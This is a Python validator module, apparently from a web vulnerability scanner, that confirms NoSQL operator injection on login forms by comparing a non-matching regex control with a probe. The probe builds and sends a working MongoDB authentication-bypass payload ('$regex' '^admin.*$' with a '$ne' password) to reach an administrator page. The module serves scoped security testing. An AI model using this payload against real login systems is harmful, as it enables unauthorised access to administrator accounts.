"""Deterministic NoSQL operator-injection confirmation for login forms.

The leg uses two fresh pre-auth sessions. A negative-control username regex that
cannot match must remain on the login boundary; an otherwise identical regex for
the declared administrator identity must reach an authenticated administrator
page. Fresh form pages provide session-bound anti-CSRF values for each attempt.
"""
from __future__ import annotations

import re
import json
import uuid
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit

from harness import global_throttle
from harness.feature_workflow import extract_forms
from harness.models import Finding, HttpExchange
from .base import ValidationResult, Validator


_USER = re.compile(r"(?:^|[_-])(user(?:name)?|login|email)(?:$|[_-])", re.I)
_PASS = re.compile(r"(?:^|[_-])(pass(?:word)?|pwd)(?:$|[_-])", re.I)
_ADMIN_READBACK = re.compile(
    r"(?:your\s+username\s+is\s*:?\s*</?[^>]*>\s*administrator|"
    r"(?:username|account|user)[^\n]{0,80}\badmin[a-z0-9_-]*\b)", re.I)


def _credential_names(body: str) -> tuple[str, str]:
    raw = (body or "").strip()
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            names = list(obj) if isinstance(obj, dict) else []
        except (TypeError, ValueError):
            names = []
    else:
        names = [k for k, _ in parse_qsl(raw, keep_blank_values=True)]
    user = next((k for k in names if _USER.search(k)), "")
    password = next((k for k in names if _PASS.search(k)), "")
    return user, password


def _administrator_readback(final_url: str, body: str) -> bool:
    parts = urlsplit(final_url or "")
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    return query.get("id", "").lower().startswith("admin") or bool(
        _ADMIN_READBACK.search(body or ""))


class NosqlValidator(Validator):
    name = "nosql"
    finding_classes = {"nosql", "nosql injection", "mongodb injection"}
    active = True

    def __init__(self, allowed_hosts=None, timeout: float = 10.0, run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self.run_context = run_context

    def _result(self, status: str, summary: str, *, confirmed: bool = False,
                confidence: float = 0.0, evidence: str = "") -> ValidationResult:
        return ValidationResult(
            validator=self.name, status=status, finding_class="nosql",
            confidence=confidence, confirmed=confirmed, summary=summary,
            evidence=evidence)

    async def _attempt(self, exchange: HttpExchange, user_name: str,
                       pass_name: str, *, administrator: bool):
        ctx = self.run_context
        if ctx is None:
            return None
        sid = f"nosql-login-{uuid.uuid4().hex[:10]}"
        ctx.sessions.register(sid, sid, allowed_origins=[exchange.url],
                              role="anonymous", name="nosql pre-auth")
        transport = ctx.target_transport()
        await global_throttle.acquire()
        page = await transport.send(
            "GET", exchange.url, capability=self.name, session_ref=sid,
            max_redirects=2)
        if not page.ok or page.status != 200:
            return None
        forms = extract_forms(page.body or "", page.final_url or exchange.url)
        form = next((f for f in forms if any(
            (fld.type or "").lower() == "password" or
            _PASS.search(fld.name or "") for fld in f.fields)), None)
        if form is None:
            return None
        values: list[tuple[str, str]] = []
        for field in form.fields:
            name = field.name or ""
            if not name or name in (user_name, pass_name):
                continue
            values.append((name, field.value or ""))
        pattern = "^admin.*$" if administrator else "^harness-no-such-user-[a-f0-9]{24}$"
        ctype = " ".join(str(v) for k, v in (exchange.request_headers or {}).items()
                         if str(k).lower() == "content-type").lower()
        if "application/json" in ctype:
            document = {k: v for k, v in values}
            document[user_name] = {"$regex": pattern}
            document[pass_name] = {"$ne": "harness-impossible-password"}
            body = json.dumps(document, separators=(",", ":"))
            content_type = "application/json"
        else:
            values.extend(((f"{user_name}[$regex]", pattern),
                           (f"{pass_name}[$ne]", "harness-impossible-password")))
            body = urlencode(values)
            content_type = "application/x-www-form-urlencoded"
        await global_throttle.acquire()
        return await transport.send(
            (form.method or "POST").upper(), urljoin(page.final_url or exchange.url, form.action),
            capability=self.name, session_ref=sid,
            headers={"Content-Type": content_type}, body=body, max_redirects=3)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        if not self.applies(finding, exchange):
            return self._result("skipped", "finding class is not NoSQL injection")
        if (exchange.method or "GET").upper() != "POST":
            return self._result("skipped", "NoSQL login differential requires a POST form")
        if "login" not in (urlsplit(exchange.url or "").path or "").lower():
            return self._result("skipped", "captured request is not a login boundary")
        user_name, pass_name = _credential_names(exchange.request_body or "")
        if not user_name or not pass_name:
            return self._result("skipped", "login request has no username/password field pair")
        if self.run_context is None:
            return self._result("skipped", "run-scoped session transport is required")

        control = await self._attempt(
            exchange, user_name, pass_name, administrator=False)
        if control is None or not control.ok:
            return self._result("error", "negative-control login request failed to execute")
        if _administrator_readback(control.final_url, control.body or ""):
            return self._result("not_confirmed", "negative control unexpectedly reached an administrator page")

        probe = await self._attempt(
            exchange, user_name, pass_name, administrator=True)
        if probe is None or not probe.ok:
            return self._result("error", "administrator operator probe failed to execute")
        if probe.status == 200 and _administrator_readback(probe.final_url, probe.body or ""):
            return self._result(
                "confirmed",
                "MongoDB operator-shaped credentials bypassed authentication and an independent account page read back the administrator identity.",
                confirmed=True, confidence=0.95,
                evidence="Non-matching regex control stayed unauthenticated; ^admin.*$ plus a password inequality reached an authenticated administrator page.")
        return self._result("not_confirmed", "operator-shaped login did not reach an administrator account page")
